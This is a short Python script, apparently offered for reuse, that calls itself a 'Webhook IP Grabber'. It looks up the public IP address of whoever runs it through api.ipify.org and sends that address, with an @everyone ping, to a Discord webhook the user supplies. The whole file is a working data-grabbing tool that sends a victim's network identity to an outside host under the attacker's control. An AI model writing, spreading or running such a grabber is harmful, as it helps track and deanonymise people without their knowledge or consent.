import socket
from requests import get
import requests
from discord import RequestsWebhookAdapter
from discord import Webhook as WebHook

webhook = "YOUR WEBHOOK" #Put your webhook here
Webhook = WebHook.from_url(webhook, adapter=RequestsWebhookAdapter())

PubIP = get('https://api.ipify.org').text

incoming = "IP incoming!"
Webhook.send(incoming)

data = {
    "content" : "@everyone",
    "username" : "Webhook IP Grabber"
}

data["embeds"] = [
    {
        "description" : f"{PubIP}",
        "title" : "Public IP:"
    }
]

result = requests.post(webhook, json = data)